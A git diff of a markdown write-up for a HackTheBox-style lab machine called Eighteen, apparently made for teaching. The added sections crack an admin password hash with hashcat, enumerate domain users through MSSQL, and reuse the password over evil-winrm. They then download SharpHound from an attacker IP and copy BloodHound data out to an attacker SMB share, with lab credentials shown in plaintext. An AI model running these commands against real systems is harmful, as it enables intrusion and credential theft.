@@ -103,7 +103,7 @@ SQL (kevin  guest@master)> exec_as_login appdev
 SQL (appdev  appdev@master)> 
 ```
 
-This turns out to be the case, and inside of the financial_planner database there are tables representative of a financial planning app, likely the same one that is advertised via the web app. Whats more interesting is there is a users table with one user, the admin. The admins hashed password is listed in the database which I will copy down and make use of in the next section.
+This turns out to be the case, and inside of the financial_planner database there are tables representative of a financial planning app, likely the same one that is advertised via the web app. Whats more interesting is there is a users table with one user, the admin. The admins hashed password is listed in the database which I will copy down and make use of later in the challenge.
 
 ```bash
 SQL (appdev  appdev@financial_planner)> SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'
@@ -123,6 +123,59 @@ SQL (appdev  appdev@financial_planner)> SELECT * FROM users;
 ----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------   
 1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03 
 ```
+
+## Admin Password Cracking
+
+With the admin password hash recovered, it seemed a natural next step to attempt to crack the hash and reveal the plaintext password. However, initial attempts to crack the password with hashcat did not prove successful. From the error logs, hashcat struggled to parse the format of the hash in question which meant I needed to understand how this hash was generated and what its components mean.
+
+Breaking it down, the hash appears to take the following format:
+
+ - Algorithm
+ - Hash Format
+ - Number of Iterations
+ - Salt
+ - Password Hash
+
+With the format now understood, I could reformat the hash to match what hashcat expects for this hash algorithm. Luckily, a python script already exists to perform this operation. Finally, the hash can be fed into hashcat with the rockyou.txt password list as a dictionary input. It reveals that the admins password is... iloveyou1.
+
+```python
+#!/usr/bin/env python3
+
+import base64
+import codecs
+import re
+import sys
+
+
+if len(sys.argv) != 2:
+    print(f'usage: {sys.argv[0]} <werkzeug hash file>')
+    print('Input file has Werkzeug hashes one per line')
+    sys.exit(1)
+
+with open(sys.argv[1], 'r') as f:
+    hashes = f.readlines()
+
+for h in hashes:
+    m = re.match(r'pbkdf2:sha256:(\d*)\$([^\$]*)\$(.*)', h)
+    iterations =  m.group(1)
+    salt = m.group(2)
+    hashe = m.group(3)
+    print(f"sha256:{iterations}:{base64.b64encode(salt.encode()).decode()}:{base64.b64encode(codecs.decode(hashe,'hex')).decode()}")
+```
+
+```bash
+sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=:iloveyou1
+```
+
+## Financial Planning as Admin
+
+Now that the admin password is known, I took a look around the financial planning web server to see if the admin had any special privileges within the web app itself. The admin does have their own dashboard however it simply confirms what I had previously discovered, there is 1 user and the app is using the mssql server to save its data. After scouting around the different menus, nothing seemed to be a likely pathway to further compromising the machine so I moved my attention elsewhere.
+
+![Admin dashboard for financial planning application](eighteen_admin.png)
+
+## Enumerating other Users
+
+Since the admin credentials do not give any further paths to traverse down on the web application, I decided to look for other accounts that might be susceptable. Given that I had correct credentials to the mssql database, I could use that access to attempt to discover other domain users. The netexec toolset has a feature to perform this automatically by formating sql queries to reveal other accounts. At the bottom of the account list, there are a series of user accounts using a firstname.lastname formatting that look interesting.
 
 ```bash
 netexec mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
@@ -168,14 +221,47 @@ MSSQL       10.129.86.193   1433   DC01             1611: EIGHTEEN\carol.white
 MSSQL       10.129.86.193   1433   DC01             1612: EIGHTEEN\dave.green
 ```
 
+To rule out the possiblity of password reuse, I attempted to login to the windows remote management solution using the discovered admin credentials from the webapp. As it turns out, adam.scott is guilty of reusing the same password for the admin account and I was able to login as his account to the windows host. The Evil-WinRM client allows for a remote powershell terminal, giving a user level foothold on the server.
+
 ```bash
-SQL (kevin  guest@master)> exec_as_login appdev
-SQL (appdev  appdev@master)> 
+evil-winrm -i eighteen.htb -u adam.scott -p iloveyou1
 ```
 
+## Privilege Escalation
+
+I began by searching through the files accessible to Adam Scott but nothing in particular stood out. I tried to get  some system information from machine however 'systeminfo' gave a permission denied response. The cmdlet Get-SystemInfo did return enough data to start establishing what the machine is. The snippet reveals that the machine is a Windows DataCenter build from 2025.
 
 
 ```bash
-sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=:iloveyou1
+*Evil-WinRM* PS C:\Users\adamscott\Documents> Get-ComputerInfo                                  
+WindowsBuildLabEx                                       : 26100.1.amd64fre.ge_release.240331-1435                       
+WindowsCurrentVersion                                   : 6.3
+WindowsEditionId                                        : ServerDatacenter  
+WindowsInstallationType                                 : Server Core
+WindowsInstallDateFromRegistry                          : 3/24/2025 3:38:13 AM
+WindowsProductId                                        : 00491-60000-17651-AA131
+WindowsProductName                                      : Windows Server 2025 Datacenter
+WindowsRegisteredOrganization                           : 
+WindowsRegisteredOwner                                  : 
+WindowsSystemRoot                                       : C:\WINDOWS                                                  
+WindowsVersion                                          : 2009                                                          
+OSDisplayVersion                                        : 24H2
+```
+
+```bash
+*Evil-WinRM* PS C:\programdata> wget http://10.10.14.77:8080/SharpHound.exe -outfile run.exe
+```
+
+```bash
+*Evil-WinRM* PS C:\programdata> net use \\10.10.14.77\share /u:exfil exfil
+The command completed successfully.
+
+*Evil-WinRM* PS C:\programdata> copy 20261109174631_BloodHound.zip \\10.10.14.77\share\
+```
+
+```bash
+┌──(kali㉿kali)-[~/projects/htb/eighteen]
+└─$ sudo impacket-smbserver share . -smb2support -username exfil -password exfil
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 ```
 
